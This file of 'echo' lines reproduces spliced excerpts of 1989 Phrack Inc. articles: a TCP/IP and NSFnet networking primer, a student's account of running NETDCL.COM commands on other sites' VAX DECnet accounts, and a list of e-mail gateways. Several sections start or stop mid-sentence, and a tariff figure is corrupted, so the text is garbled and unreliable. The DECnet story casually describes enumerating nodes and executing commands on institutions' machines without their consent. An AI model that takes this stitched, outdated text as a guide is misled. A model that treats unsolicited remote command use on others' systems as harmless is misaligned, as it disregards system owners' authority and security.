echo Pittsburgh Supercomputing Center
echo San Diego Supercomputing Center
echo In addition, researchers and scientists can communicate with each other over a vast world-wide computer network that includes the NSFnet, 
echo ARPAnet, CSnet, BITnet, and others that you have read about in The Future Transcendent Saga. Please refer to "Frontiers" (Phrack Inc., 
echo Volume Two, Issue 24, File 4 of 13) for more details.
echo MIDnet is just one of several regional computer networks that comprise the NSFnet system. Although all of these regional computer networks 
echo work the same, MIDnet is the only one that I have direct access to and so this file is written from a MIDnet point of view. For people who have 
echo access to the other regional networks of NSFnet, the only real differences depicted in this file that would not apply to the other regional 
echo networks are the universities that are served by MIDnet as opposed to:
echo NYSERnet in New York State
echo SURAnet in the southeastern United States
echo SEQSUInet in Texas
echo BARRnet in the San Francisco area
echo MERIT in Michigan
echo (There are others that are currently being constructed.)
echo These regional networks all hook into the NSFnet backbone, which is a network that connects the six supercomputer centers. For example, a 
echo person at Kansas State University can connect with a supercomputer via MIDnet and the NSFnet backbone. That researcher can also send 
echo mail to colleagues at the University of Delaware by using MIDnet, NSFnet and SURAnet. Each university has its own local computer network 
echo which connects on-campus computers as well as providing a means to connecting to a regional network.
echo Some universities are already connected to older networks such as CSnet, the ARPAnet and BITnet. In principal, any campus connected to 
echo any of these networks can access anyone else in any other network since there are gateways between the networks.
echo Gateways are specialized computers that forward network traffic, thereby connecting networks. In practice, these wide-area networks use 
echo different networking technology which make it impossible to provide full functionality across the gateways. However, mail is almost universally 
echo supported across all gateways, so that a person at a BITnet site can send mail messages to a colleague at an ARPAnet site (or anywhere else 
echo for that matter). You should already be somewhat familiar with this, but if not refer to; "Limbo To Infinity" (Phrack Inc., Volume Two, Issue 24, 
echo File 3 of 13) and "Internet Domains" (Phrack Inc., Volume Three, Issue 26, File 8 of 11)
echo Computer networks rely on hardware and software that allow computers to communicate. The language that enables network communication 
echo is called a protocol. There are many different protocols in use today. MIDnet uses the TCP/IP protocols, also known as the DOD (Department 
echo of Defense) Protocol Suite.
echo Other networks that use TCP/IP include ARPAnet, CSnet and the NSFnet. In fact, all the regional networks that are linked to the NSFnet 
echo backbone are required to use TCP/IP. At the local campus level, TCP/IP is often used, although other protocols such as IBM's SNA and DEC's 
echo DECnet are common. In order to communicate with a computer via MIDnet and the NSFnet, a computer at a campus must use TCP/IP directly or 
echo use a gateway that will translate its protocols into TCP/IP.
echo The Internet is a world-wide computer network that is the conglomeration of most of the large wide area networks, including ARPAnet, CSnet, 
echo NSFnet, and the regionals, such as MIDnet. To a lesser degree, other networks such as BITnet that can send mail to hosts on these networks 
echo are included as part of the Internet. This huge network of networks, the Internet, as you have by now read all about in the pages of Phrack 
echo Inc., is a rapidly growing and very complex entity that allows sophisticated communication between scientists, students, government officials 
echo and others. Being a part of this community is both exciting and challenging.
echo This chapter of the Future Transcendent Saga gives a general description of the protocols and software used in MIDnet and the NSFNet. A 
echo discussion of several of the more commonly used networking tools is also included to enable you to make practical use of the network as soon 
echo as possible.
echo The DOD Protocol Suite
echo The DOD Protocol Suite includes many different protocols. Each protocol is a specification of how communication is to occur between 
echo computers. Computer hardware and software vendors use the protocol to create programs and sometimes specialized hardware in order to 
echo implement the network function intended by the protocol. Different implementations of the same protocol exist for the varied hardware and 
echo operating systems found in a network.
echo The three most commonly used network functions are:
echo Mail -- Sending and receiving messages
echo File Transfer -- Sending and receiving files
echo Remote Login -- Logging into a distant computer
echo Of these, mail is probably the most commonly used.
echo In the TCP/IP world, there are three different protocols that realize these
echo functions:
echo SMTP -- (Simple Mail Transfer Protocol) Mail
echo FTP -- (File Transfer Protocol) sending and receiving files
echo Telnet -- Remote login
echo How to use these protocols is discussed in the next section. At first glance, it is not obvious why these three functions are the most common. 
echo After all, mail and file transfer seem to be the same thing. However, mail messages are not identical to files, since they are usually comprised 
echo of only ASCII characters and are sequential in structure. Files may contain binary data and have complicated, non-sequential structures. Also, 
echo mail messages can usually tolerate some errors in transmission whereas files should not contain any errors. Finally, file transfers usually 
echo occur in a secure setting (i.e. The users who are transferring files know each other's names and passwords and are permitted to transfer the 
echo file, whereas mail can be sent to anybody as long as their name is known).
echo While mail and transfer accomplish the transfer of raw information from one computer to another, Telnet allows a distant user to process that 
echo information, either by logging in to a remote computer or by linking to another terminal. Telnet is most often used to remotely log in to a distant 
echo computer, but it is actually a general-purpose communications protocol. I have found it incredibly useful over the last year. In some ways, it 
echo could be used for a great deal of access because you can directly connect to another computer anywhere that has TCP/IP capabilities, 
echo however please note that Telnet is *NOT* Telenet. There are other functions that some networks provide, including the following:
echo · Name to address translation for networks, computers and people
echo · The current time
echo · Quote of the day or fortune
echo · Printing on a remote printer, or use of any other remote peripheral
echo · Submission of batch jobs for non-interactive execution
echo · Dialogues and conferencing between multiple users
echo · Remote procedure call (i.e. Distributing program execution over several remote computers)
echo · Transmission of voice or video information
echo Some of these functions are still in the experimental stages and require faster computer networks than currently exist. In the future, new 
echo functions will undoubtedly be invented and existing ones improved.
echo The DOD Protocol Suite is a layered network architecture, which means that network functions are performed by different programs that work 
echo independently and in harmony with each other. Not only are there different programs but there are different protocols. The protocols SMTP, 
echo FTP and Telnet are described above. Protocols have been defined for getting the current time, the quote of the day, and for translating names. 
echo These protocols are called applications protocols because users directly interact with the programs that implement these protocols.
echo The Transmission Control Protocol, TCP, is used by many of the application protocols. Users almost never interact with TCP directly. TCP 
echo establishes a reliable end-to-end connection between two processes on remote computers. Data is sent through a network in small chunks 
echo called packets to improve reliability and performance. TCP ensures that packets arrive in order and without errors. If a packet does have 
echo errors, TCP requests that the packet be retransmitted.
echo In turn, TCP calls upon IP, Internet Protocol, to move the data from one network to another. IP is still not the lowest layer of the architecture, 
echo since there is usually a "data link layer protocol" below it. This can be any of a number of different protocols, two very common ones being 
echo X.25 and Ethernet.
echo FTP, Telnet and SMTP are called "application protocols", since they are directly used by applications programs that enable users to make use of 
echo the network. Network applications are the actual programs that implement these protocols and provide an interface between the user and the 
echo computer. An implementation of a network protocol is a program or package of programs that provides the desired network function such as 
echo file transfer. Since computers differ from vendor to vendor (e.g. IBM, DEC, CDC), each computer must have its own implementation of these 
echo protocols. However, the protocols are standardized so that computers can interpolate over the network (i.e. Can understand and process 
echo each other's data). For example, a TCP packet generated by an IBM computer can be read and processed by a DEC computer.
echo In many instances, network applications programs use the name of the protocol. For example, the program that transfers files may be called 
echo "FTP" and the program that allows remote logins may be called "Telnet." Sometimes these protocols are incorporated into larger packages, as is 
echo common with SMTP. Many computers have mail programs that allow users on the same computer to send mail to each other. SMTP functions 
echo are often added to these mail programs so that users can also send and receive mail through a network. In such cases, there is no separate 
echo program called SMTP that the user can access, since the mail program provides the user interface to this network function.
echo Specific implementation of network protocols, such as FTP, are tailored to the computer hardware and operating system on which they are 
echo used. Therefore, the exact user interface varies from one implementation to another. For example, the FTP protocol specifies a set of FTP 
echo commands which each FTP implementation must understand and process. However, these are usually placed at a low level, often invisible to 
echo the user, who is given a higher set of commands to use.
echo These higher-level commands are not standardized so they may vary from one implementation of FTP to another. For some operating systems, 
echo not all of these commands make equal sense, such as "Change Directory," or may have different meanings. Therefore the specific user 
echo interface that the user sees will probably differ.
echo This file describes a generic implementation of the standard TCP/IP application protocols. Users must consult local documentation for specifics 
echo at their sites.
echo Names and Addresses In A Network
echo In DOD Protocol Suite, each network is given a unique identifying number. This number is assigned by a central authority, namely the Network 
echo Information Center run by SRI, abbreviated as SRI-NIC, in order to prevent more than one network from having the same network number. For 
echo example, the ARPAnet has network number 10 while MIDnet has a longer number, namely 128.242. Each host in a network has a unique 
echo identification so other hosts can specify them unambiguously. Host numbers are usually assigned by the organization that manages the 
echo network, rather than one central authority. Host numbers do not need to be unique throughout the whole Internet but two hosts on the same 
echo network need to have unique host numbers.
echo The combination of the network number and the host number is called the IP address of the host and is specified as a 32-bit binary number. All 
echo IP addresses in the Internet are expressible as 32-bit numbers, although they are often written in dotted decimal notation. Dotted decimal 
echo notation breaks the 32-bit number into four eight-bit parts or octets and each octet is specified as a decimal number. For example, 00000001 is 
echo the binary octet that specifies the decimal number 1, while 11000000 specifies 192. Dotted decimal notation makes IP addresses much easier to 
echo read and remember.
echo Computers in the Internet are also identified by hostnames, which are strings of characters, such as "phrackvax." However, IP packets must 
echo specify the 32-bit IP address instead of the hostname so some way to translating hostnames to IP addresses must exist.
echo One way is to have a table of hostnames and their corresponding IP addresses, called a hosttable. Nearly every TCP/IP implementation has 
echo such a hosttable, although the weaknesses of this method are forcing a shift to a new scheme called the domain name system. In UNIX 
echo systems, the hosttable is often called "/etc/hosts." You can usually read this file and find out what the IP addresses of various hosts are. 
echo Other systems may call this file by a different name and make it unavailable for public viewing.
echo Users of computers are generally given accounts to which all charges for computer use are billed. Even if computer time is free at an 
echo installation, accounts are used to distinguish between the users and enforce file protections. The generic term "username" will be used in this 
echo file to refer to the name by which the computer account is accessed.
echo In the early days of the ARPAnet which was the first network to use the TCP/IP protocols, computer users were identified by their username, 
echo followed by a commercial "at" sign (@), followed by the hostname on which the account existed. Networks were not given names, per se, 
echo although the IP address specified a network number.
echo For example, "knight@phrackvax" referred to user "knight" on host "phrackvax." This did not specify which network "phrackvax" was on, 
echo although that information could be obtained by examining the hosttable and the IP address for "phrackvax." (However, "phrackvax" is a 
echo fictitious hostname used for this presentation.)
echo As time went on, every computer on the network had to have an entry in its hosttable for every other computer on the network. When several 
echo networks linked together to form the Internet, the problem of maintaining this central hosttable got out of hand. Therefore, the domain name 
echo scheme was introduced to split up the hosttable and make it smaller and easier to maintain.
echo In the new domain name scheme, users are still identified by their usernames, but hosts are now identified by their hostname and any and all 
echo domains of which they are a part. For example, the address "KNIGHT@UMCVMB.MISSOURI.EDU" specifies username "KNIGHT" on host 
echo "UMCVMB". However, host "UMCVMB" is a part of the domain "MISSOURI" " which is in turn part of the domain "EDU". There are other domains 
echo in "EDU", although only one is named "MISSOURI". In the domain "MISSOURI", there is only one host named "UMCVMB".
echo However, other domains in "EDU" could theoretically have hosts named "UMCVMB" (although I would say that this is rather unlikely in this 
echo example). Thus the combination of hostname and all its domains makes it unique. The method of translating such names into IP addresses is 
echo no longer as straightforward as looking up the hostname in a table. Several protocols and specialized network software called nameservers 
echo and resolvers implement the domain name scheme.
echo Not all TCP/IP implementations support domain names because it is rather new. In those cases, the local hosttable provides the only way to 
echo translate hostnames to IP addresses. The system manager of that computer will have to put an entry into the hosttable for every host that 
echo users may want to connect to. In some cases, users may consult the nameserver themselves to find out the IP address for a given hostname 
echo and then use that IP address directly instead of a hostname.
echo I have selected a few network hosts to demonstrate how a host system can be specified by both the hostname and host numerical address. 
echo Some of the nodes I have selected are also nodes on BITnet, perhaps even some of the others that I do not make a note of due a lack of 
echo omniscient awareness about each and every single host system in the world :-)

echo Please Note: Not every system on BITnet has an IP address. Likewise, not every system that has an IP address is on BITnet. Also, while 
echo some locations like Stanford University may have nodes on BITnet and have hosts on the IP as well, this does not necessarily imply that the 
echo systems on BITnet and on IP (the EDU domain in this case) are the same systems.
echo Attempts to gain unauthorized access to systems on the internet are not tolerated and is legally a federal offense. At some hosts, they take 
echo this very seriously, especially the government hosts such as NASA's Goddard Space Flight Center, where they do not mind telling you so at 
echo the main prompt when you connect to their system.
echo However, some nodes are public access to an extent. The DDN Network Information Center can be used by anyone. The server and database 
echo there have proven to be an invaluable source of information when locating people, systems, and other information that is related to the Internet.
echo Telnet
echo Remote login refers to logging in to a remote computer from a terminal connected to a local computer. Telnet is the standard protocol in the DOD 
echo Protocol Suite for accomplishing this. The "rlogin" program, provided with Berkeley UNIX systems and some other systems, also enables 
echo remote login.
echo For purposes of discussion, the "local computer" is the computer to which your terminal is directly connected while the "remote computer" is 
echo the computer on the network to which you are communicating and to which your terminal is *NOT* directly connected.
echo Since some computers use a different method of attaching terminals to computers, a better definition would be the following: The "local 
echo computer" is the computer that you are currently using and the "remote computer" is the computer on the network with which you are or will be 
echo communicating. Note that the terms "host" and "computer" are synonymous in the following discussion.
echo To use Telnet, simply enter the command: TELNET
echo The prompt that Telnet gives is: Telnet>
echo (However, you can specify where you want to Telnet to immediately and bypass the prompts and other delays by issuing the command: 
echo TELNET [location].)
echo There is help available by typing in ?. This prints a list of all the valid
echo subcommands that Telnet provides with a one-line explanation.
echo Telnet> ?
echo To connect to another computer, use the open subcommand to open a connection
echo to that computer. For example, to connect to the host "UMCVMB.MISSOURI.EDU",
echo do "open umcvmb.missouri.edu"
echo Telnet will resolve (i.e. Translate, the hostname "umcvmb.missouri.edu" into an
echo IP address and will send a packet to that host requesting login. If the remote
echo host decides to let you attempt a login, it prompts you for your username and password. If the host does not respond, Telnet will "time out" (i.e. 
echo Wait for a reasonable amount of time such as 20 seconds) and then terminate with a message such as "Host not responding."
echo If your computer does not have an entry for a remote host in its hosttable and it cannot resolve the name, you can use the IP address explicitly 
echo in the telnet command. For example,
echo TELNET 26.0.0.73 (Note: This is the IP address for the DDN Network Information Center [SRI-NIC.ARPA])
echo If you are successful in logging in, your terminal is connected to the remote host. For all intents and purposes, your terminal is directly hardwired to that host and you should be able to do anything on your remote terminal that you can do at any local terminal. There are a few 
echo exceptions to this rule, however.
echo Telnet provides a network escape character, such as CONTROL-T. You can find out what the escape character is by entering the "status" 
echo subcommand:
echo Telnet> status
echo You can change the escape character by entering the "escape" subcommand:
echo Telnet> escape
echo When you type in the escape character, the Telnet prompt returns to your screen and you can enter subcommands. For example, to break the 
echo connection, which usually logs you off the remote host, enter the subcommand "quit":
echo Telnet> quit
echo Your Telnet connection usually breaks when you log off the remote host, so the "quit" subcommand is not usually used to log off.
echo When you are logged in to a remote computer via Telnet, remember that there is a time delay between your local computer and the remote one. 
echo This often becomes apparent to users when scrolling a long file across the terminal screen and they wish to cancel the scrolling by typing 
echo CONTROL-C or something similar. After typing the special control character, the scrolling continues. The special control character takes a 
echo certain amount of time to reach the remote computer which is still scrolling information. Thus response from the remote computer will not likely 
echo be as quick as response from a local computer. Once you are remotely logged on, the computer you are logged on to effectively becomes your 
echo "local computer," even though your original "local computer" still considers you logged on. You can log on to a third computer which would 
echo then become your "local computer" and so on. As you log out of each session, your previous session becomes active again.
echo File Transfer
echo FTP is the program that allows files to be sent from one computer to another.
echo "FTP" stands for "File Transfer Protocol".
echo When you start using FTP, a communications channel with another computer on the network is opened. For example, to start using FTP and 
echo initiate a file transfer session with a computer on the network called "UMCVMB", you would issue the following subcommand:
echo FTP UMCVMB.MISSOURI.EDU
echo Host "UMCVMB" will prompt you for an account name and password. If your login is correct, FTP will tell you so, otherwise it will say "login 
echo incorrect." Try again or abort the FTP program. (This is usually done by typing a special control character such as CONTROL-C. The "program 
echo abort" character varies from system to system.)
echo Next you will see the FTP prompt, which is:
echo Ftp>
echo There are a number of subcommands of FTP. The subcommand "?" will list these commands and a brief description of each one.
echo You can initiate a file transfer in either direction with FTP, either from the remote host or to the remote host. The "get" subcommand initiates a 
echo file transfer from the remote host (i.e. Tells the remote computer to send the file to the local computer [the one on which you issued the "ftp" 
echo command]). Simply enter "get" and FTP will prompt you for the remote host's file name and the (new) local host's file name. Example:
echo Ftp> get
echo Remote file name?
echo theirfile
echo local file name?
echo myfile
echo You can abbreviate this by typing both file names on the same line as the "get" subcommand. If you do not specify a local file name, the new 
echo local file will be called the same thing as the remote file. Valid FTP subcommands to get a file include the following:
echo get theirfile myfile
echo get doc.x25
echo The "put" subcommand works in a similar fashion and is used to send a file from the local computer to the remote computer. Enter the command 
echo "put" and FTP will prompt you for the local file name and then the remote file name. If the transfer cannot be done because the file doesn't exist 
echo or for some other reason, FTP will print an error message.
echo There are a number of other subcommands in FTP that allow you to do many more things. Not all of these are standard so consult your local 
echo documentation or type a question mark at the FTP prompt. Some functions often built into FTP include the ability to look at files before getting or 
echo putting them, the ability to change directories, the ability to delete files on the remote computer, and the ability to list the directory on the remote 
echo host.
echo An intriguing capability of many FTP implementations is "third party transfers." For example, if you are logged on computer A and you want to 
echo cause computer B to send a file to computer C, you can use FTP to connect to computer B and use the "rmtsend" command. Of course, you 
echo have to know usernames and passwords on all three computers, since FTP never allows you to peek into someone's directory and files 
echo unless you know their username and password.
echo The "cd" subcommand changes your working directory on the remote host. The "lcd" subcommand changes the directory on the local host. For 
echo UNIX systems, the meaning of these subcommands is obvious. Other systems, especially those that do not have directory-structured file
echo system, may not implement these commands or may implement them in a different manner.
echo The "dir" and "ls" subcommands do the same thing, namely list the files in the working directory of the remote host.
echo The "list" subcommand shows the contents of a file without actually putting it into a file on the local computer. This would be helpful if you just 
echo wanted to inspect a file. You could interrupt it before it reached the end of the file by typing CONTROL-C or some other special character. This 
echo is dependent on your FTP implementation.
echo The "delete" command can delete files on the remote host. You can also make and remove directories on the remote host with "mkdir" and 
echo "rmdir". The "status" subcommand will tell you if you are connected and with whom and what the state of all your options are.
echo If you are transferring binary files or files with any non-printable characters, turn binary mode on by entering the "binary" subcommand:
echo binary
echo To resume non-binary transfers, enter the "ascii" subcommand.
echo Transferring a number of files can be done easily by using "mput" (multiple put) and "mget" (multiple get). For example, to get every file in a 
echo particular directory, first issue a "cd" command to change to that directory and then a "mget" command with an asterisk to indicate every file:
echo cd somedirectory
echo mget *
echo When you are done, use the "close" subcommand to break the communications link. You will still be in FTP, so you must use the "bye" 
echo subcommand to exit FTP and return to the command level. The "quit" subcommand will close the connection and exit from FTP at the same time.
echo Mail
echo Mail is the simplest network facility to use in many ways. All you have to do is to create your message, which can be done with a file editor or 
echo on the spur of the moment, and then send it. Unlike FTP and Telnet, you do not need to know the password of the username on the remote 
echo computer. This is so because you cannot change or access the files of the remote user nor can you use their account to run programs. All you 
echo can do is to send a message.
echo There is probably a program on your local computer which does mail between users on that computer. Such a program is called a mailer. This 
echo may or may not be the way to send or receive mail from other computers on the network, although integrated mailers are more and more 
echo common. UNIX mailers will be used as an example in this discussion.
echo Note that the protocol which is used to send and receive mail over a TCP/IP network is called SMTP, the "Simple Mail Transfer Protocol." 
echo Typically, you will not use any program called SMTP, but rather your local mail program.
echo UNIX mailers are usually used by invoking a program named "mail". To receive new mail, simply type "mail". There are several varieties of UNIX 
echo mailers in existence. Consult your local documentation for details. For example, the command "man mail" prints out the manual pages for the mail 
echo program on your computer.
echo To send mail, you usually specify the address of the recipient on the mail command. For example: "mail knight@umcvmb.missouri.edu" will send 
echo the following message to username "knight" on host "umcvmb".
echo You can usually type in your message one line at a time, pressing RETURN after each line and typing CONTROL-D to end the message. Other 
echo facilities to include already-existing files sometimes exist. For example, Berkeley UNIX's allow you to enter commands similar to the following to 
echo include a file in your current mail message:
echo r myfile
echo In this example, the contents of "myfile" are inserted into the message at this point.
echo Most UNIX systems allow you to send a file through the mail by using input redirection. For example:
echo mail knight@umcvmb.missouri.edu < myfile
echo In this example, the contents of "myfile" are sent as a message to "knight" on "umcvmb."
echo Note that in many UNIX systems the only distinction between mail bound for another user on the same computer and another user on a remote 
echo computer is simply the address specified. That is, there is no hostname for local recipients. Otherwise, mail functions in exactly the same way. 
echo This is common for integrated mail packages. The system knows whether to send the mail locally or through the network based on the 
echo address and the user is shielded from any other details.

echo is provided for several DECnet-Utilities and as a pseudo-guest-account. The DECNET-account has very restricted privileges: You cannot edit a 
echo file or make another remote login.
echo The HELP is equipped by the system and is similar to the MAN command on UNIX.
echo More information on DECnet can be found in "Looking Around In DECnet" by Deep Thought in this very issue of Phrack Inc.
echo Here, at the University of Ulm, we have an *incredibly* ignorant computer center staff, with an even bigger lack of system-literature (besides 
echo the 80kg of VAX/VMS-manuals). The active may search for information by himself, which is over the level of "run," "FORTRAN," or "logout." 
echo My good luck that I have other accounts in the BELWUE-DECnet, where more information is offered for the users. I am a regular student in Ulm 
echo and all my accounts are completely legal and corresponding to the German laws. I don't call myself a "hacker," I feel more like a "user" (...it's 
echo more a defining-problem).
echo In the HELP-menu in a host in Tuebingen I found the file netdcl.com and the corresponding explanation, which sends commands to the DECNETAccount of other VAX's and executes them there (remote command). The explanation in the HELP-menu was idiot-proof -- therefore for me, 
echo too :-)
echo With the command "$ mcr ncp show known nodes" you can obtain a list of all netwide active VAX's, as is generally known, and so I pinged all 
echo these VAX's to look for more information for a knowledge-thirsty user. With "help", "dir" and other similar commands I look around on those 
echo DECnet accounts, always watching for topics related to the BELWUE-network. It's a pity, that 2/3 of all VAX's have locked the DECNETAccount for NETDCL.COM. Their system managers are probably afraid of unauthorized access, but I cannot imagine how there could be such 
echo an unauthorized access, because you cannot log on this account -- no chance for trojan horses, etc.
echo Some system managers called me back after I visited their VAX to chat with me about the network and asked me if they could help me in any 
echo way. One sysop from Stuttgart even sent me a version of NETDCL.COM for the ULTRIX operation system.
echo  Then, after a month, the HORROR came over me in shape of a the following mail:
echo --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---
echo From: TUEBINGEN::SYSTEM 31-MAY-1989 15:31:11.38
echo To: FRAMSTAG

echo Subj: don't make any crap, or you'll be kicked out
echo From: ITTGPX::SYSTEM 29-MAY-1989 16:46
echo To: TUEBINGEN::SYSTEM
echo Subj: System-breaking-in 01-May-1989
echo To the system manager of the Computer TUEBINGEN,
echo On May 1st 1989 we had a System-breaking-in in our DECNET-account, which started from your machine. By help of our accounting we 
echo ascertained your user FRAMSTAG to have emulated an interactive log-on on our backbone-node and on every machine of our VAX-cluster 
echo with the "trojan horse" NETDCL.COM. Give us this user's name and address and dear up the occurrence completely. We point out that the user 
echo is punishable. In case of repetition we would be forced to take corresponding measures. We will check whether our system got injured. If not, 
echo this time we will disregard any measure. Inform us via DECnet about your investigation results -- we are attainable by the nodenumber 
echo 1084::system
echo Dipl.-Ing. Michael Hager
echo --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---
echo  My system manager threatened me with the deleting of my account, if I would not immediately enlighten the affair. *Gulp* I was conscious 
echo about my innocence, but how to tell it to the others? I explained, step by step, everything to my system manager. He then understood after a
echo while, but the criminal procedure still hovered over me... so, I took quickly to my keyboard, to compose file of explanations and to send it to that 
echo angry system manager in Stuttgart (node 1084 is an institute there). But no way out: He had run out of disk quota and my explanation-mail 
echo sailed into the nirwana:
echo --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---
echo $ mail explanation
echo  To: 1084::system
echo %MAIL-E, error sending to user SYSTEM at 1084

echo SYS$SYSROOT:[SYSMGR]MAIL$00040092594FD194.MAI;
echo as output
echo -RMS-E-CRE, ACP file create failed
echo -SYSTEM-F-EXDISKQUOTA, disk quota exceeded
echo --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---
echo Also the attempt of a connection with the PHONE-facility failed: In his borderless hacker-paranoia, he cut off his PHONE... and nowhere is a list 
echo with the REAL-addresses of the virtual DECnet-addresses available (to prevent hacking). Now I stood there with the brand "DANGEROUS 
echo HACKER" and I had no chance to vindicate myself. I poured out my troubles to an acquaintance of mine, who is a sysop in the computer-center 
echo in Freiburg. He asked other sysops and managers thru the whole BELWUE-network until someone gave him a telephone number after a few 
echo days -- and that was the right one
echo  I phoned to this Hager and told him what I had done with his DECnet-account and also what NOT. I wanted to know which crime I had 
echo committed. He promptly canceled all of his reproaches, but he did not excuse his defames incriminations. I entreated him to inform my system 
echo manager in Tuebingen that I have done nothing illegal and to stop him from erasing my account. This happens already to a fellow student of 
echo mine (in this case, Hager was also guilty). He promised me that he would officially cancel his reproaches.
echo  After over a week this doesn't happen (I'm allowed to use my account further on). In return for it, I received a new mail from Hager on 
echo another account of mine:
echo --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---
echo From: 1084::HAGER 1-JUN-1989 12:51
echo To: 50180::STUD_11
echo Subj: System-breaking-in
echo On June 1st 1989 you have committed a system-breaking-in on at least one of our VAX's. We were able to register this occurrence. We 
echo would be forced to take further measure if you did not dear up the occurrence completely until June 6th.
echo Of course the expenses involved would be imposed on you. Hence enlightenment must be in your own interest.
echo We are attainable via DECnet-mail with the address 1084::HAGER or via following

echo ACSNET
echo Australian Computer Science Network (ACSNET), also known as Oz, has its gateway through the CSNET node munnari.oz.au and if you 
echo cannot directly mail to the oz.au domain, try either username%munnari.oz.au@UUNET.UU.NET or munnari username@UUNET.UU.NET.
echo ATandT MAIL
echo ATandT Mail is a mailing service of ATandT, probably what you might call it's MCI-Mail equivalent. It is available on the UUCP network as node name 
echo attmail but I've had problems having mail get through. Apparently, it does cost money to mail to this service and the surrounding nodes are not 
echo willing to pick up the tab for the ingoing mail, or at least, this has seemingly been the case thus far. I believe, though, that perhaps routing to 
echo attuser would work.
echo ATandT recently announced six new X.400 interconnections between ATandT Mail and electronic mail services in the US, Korea, Sweden, 
echo Australia, and Finland. In the US, ATandT Mail is now interconnected with Telenet Communications Corporation's service, Telemail, allowing users 
echo of both services to exchange messages easily. With the addition of these interconnections, the ATandT Mail Gateway 400 Service allows ATandT 
echo Mail subscribers to exchange messages with users of the following electronic messaging systems:
echo Company E-Mail Name Country
echo TeleDelta TeDe 400 Sweden
echo OTC MPS400 Australia
echo Telecom-Canada Envoy100 Canada
echo DACOM DACOM MHS Korea
echo PandT-Tele MailNet 400 Finland
echo Helsinki Telephone Co. ELISA Finland
echo Dialcom Dialcom USA
echo Telenet Telemail USA
echo KDD Messavia Japan
echo Transpac ATLAS400 France
echo The interconnections are based on the X.400 standard, a set of guidelines for the format, delivery and receipt of electronic messages 
echo recommended by an international standards committee the CCITT. International X.400 messages incur a surcharge. They are:
echo To Canada:
echo Per note: $.05
echo Per message unit: $.10
echo To other international locations:
echo Per note: $.20
echo Per message unit: $«0
echo There is no surcharge for X.400 messages within the US The following are contacts to speak with about mailing through these mentioned

echo CMR
echo Previously known as Intermail, the Commercial Mail Relay (CMR) Service is a mail relay service between the Internet and three commercial 
echo electronic mail systems: US Sprint/Telenet, MCI-Mail, and DIALCOM systems (i.e. Compmail, NSFMAIL, and USDA-MAIL).
echo An important note: The only requirement for using this mail gateway is that the work conducted must be DARPA sponsored research and other 
echo approved government business. Basically, this means that unless you've got some government-related business, you're not supposed to be 
echo using this gateway. Regardless, it would be very difficult for them to screen everything that goes through their gateway. Before I understood 
echo the requirements of this gateway, I was sending to a user of MCI-Mail and was not contacted about any problems with that communication. 
echo Unfortunately, I mistyped the MCI-Mail address on one of the letters and that letter ended up getting read by system administrators who then 
echo informed me that I was not to be using that system, as well as the fact that they would like to bill me for using it. That was an interesting 
echo thought on their part anyway, but do note that using this service does incur charges.
echo The CMR mailbox address in each system corresponds to the label:
echo Telemail: [Intermail/USCISI]TELEMAIL/USA
echo MCI-Mail: Intermail or 107-8239
echo CompMail: Intermail or CMP0817
echo NSF-Mail: Intermail or NSF153
echo USDA-Mail: Intermail or AGS9999
echo Addressing examples for each e-mail system are as follows:
echo MCIMAIL:
echo  123-4567 seven digit address
echo  Everett T. Bowens person's name (must be unique)
echo COMPMAIL:
echo  CMP0123 three letters followed by three or four digits
echo  S.Cooper initial, then "." and then last name
echo  134:CMP0123 domain, then ":" and then combination system and
echo  account number
echo NSFMAIL:
echo  NSF0123 three letters followed by three or four digits
echo  A.Phillips initial, then "." and then last name
echo  157:NSF0123 domain, then ":" and then combination system and
echo  account number
echo USDAMAIL:
echo  AGS0123 three letters followed by three or four digits
echo  P.Shifter initial, then "." and then last name
echo  157:AGS0123 domain, then ":" and then combination system and
echo  account number
echo TELEMAIL:
echo  BARNOC user (directly on Telemail)
echo  BARNOC/LODH user/organization (directly on Telemail)
echo  [BARNOC/LODH]TELEMAIL/USA
echo  [user/organization]system branch/country

echo For more information and instructions on how to use CMR, send a message to the user support group at intermail-request@intermail.isi.edu 
echo (you'll get basically what I've listed plus maybe a bit more). Please read Chapter 3 of The Future Transcendent Saga (Limbo to Infinity) for 
echo specifics on mailing to these destination mailing systems.
echo COMPUSERVE
echo CompuServe is well known for its games and conferences. It does, though, have mailing capability. Now, they have developed their own 
echo Internet domain, called COMPUSERVE.COM. It is relatively new and mail can be routed through either TUT.CIS.OHIO-STATE.EDU or 
echo NORTHWESTERN.ARPA.
echo Example: user%COMPUSERVE.COM@TUT.CIS.OHIO-STATE.EDU or replace TUT.CIS.OHIO-STATE.EDU with NORTHWESTERN.ARPA).
echo The CompuServe link appears to be a polled UUCP connection at the gateway machine. It is actually managed via a set of shell scripts and a 
echo comm utility called xcomm, which operates via command scripts built on the fly by the shell scripts during analysis of what jobs exist to go into 
echo and out of CompuServe.
echo CompuServe subscriber accounts of the form 7xxxx, yyyy can be addressed as 7xxxx.yyyy@compuserve.com. CompuServe employees can 
echo be addressed by their usernames in the csi.compuserve.com subdomain. CIS subscribers write mail to ">inet:user@host.domain" to mail to 
echo users on the Wide-Area Networks, where ">gateway:" is CompuServe's internal gateway access syntax. The gateway generates fully -RFCcompliant headers.
echo To fully extrapolate -- from the CompuServe side, you would use their EasyPlex mail system to send mail to someone in BITNET or the Internet. 
echo For example, to send me mail at my Bitnet ID, you would address it to:
echo  INET:C488869%UMCVMB.BITNET@CUNYVM.CUNY.EDU
echo Or to my Internet ID:
echo  INET:C488869@UMCVMB.MISSOURI.EDU
echo Now, if you have a BITNET to Internet userid, this is a silly thing to do, since your connect time to CompuServe costs you money. However, you 
echo can use this information to let people on CompuServe contact YOU. CompuServe Customer Service says that there is no charge to either 
echo receive or send a message to the Internet or BITNET.
echo DASNET
echo DASnet is a smaller network that connects to the Wide-Area Networks but charges for their service. DASnet subscribers get charged for both 
echo mail to users on other networks AND mail for them from users of other networks. The following is a brief description of DASnet, some of 
echo which was taken from their promotional text letter.
echo DASnet allows you to exchange electronic mail with people on more than 20 systems and networks that are interconnected with DASnet. One 
echo of the drawbacks, though, is that, after being subscribed to these services, you must then subscribe to DASnet, which is a separate cost. 
echo Members of Wide-Area networks can subscribe to DASnet too. Some of the networks and systems reachable through DASnet include the 
echo following:
